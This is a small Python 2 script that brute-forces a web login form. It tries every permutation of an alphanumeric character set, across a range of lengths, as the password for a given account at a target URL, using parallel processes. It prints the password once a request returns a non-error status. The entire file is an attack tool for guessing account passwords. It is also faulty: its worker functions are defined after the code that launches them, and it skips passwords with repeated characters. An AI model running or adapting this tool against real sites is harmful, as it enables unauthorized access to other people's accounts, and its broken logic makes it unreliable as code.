import itertools, urllib, urllib2, sys, multiprocessing, os, signal

def brute(i, url = '', form = 'account', form1 = 'password', account = ''):
	work(itertools.permutations('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_', i), url, form, form1, account)

if __name__ == '__main__':
    jobs = []
    try:
    	account = sys.argv[1]
    	n = int(sys.argv[2])
    	m = int(sys.argv[3])
    	url = sys.argv[4]
    	pass
    except Exception, e:
    	print e
    	print 'Error... program is going to be exit...'
    	sys.exit()
    	pass
    try:
    	form = sys.argv[5]
    	pass
    except Exception, e:
    	form = 'account'
    	pass
    try:
    	form1 = sys.argv[6]
    	pass
    except Exception, e:
    	form1 = 'password'
    	pass

    for i in xrange(n,m+1):
    	p = multiprocessing.Process(target=brute, args=(i,url,form,form1,account,))
        jobs.append(p)
        p.start()

def work(res, url, form, form1, account):
	for n in res:
		password = ''.join(n)
		send(url, form, form1, account, password)
		pass
	pass

# form => password filed
def send(url, form, form1, account, password):
	try: 
		if urllib2.urlopen(urllib2.Request(url, urllib.urlencode({form : account ,form1 : password}))).getcode() < 400:
			print 'success! ...... password: ' + str(password)
			os.kill(signal.CTRL_C_EVENT, 1)
			pass
		pass
	except Exception, e:
		''
	pass
		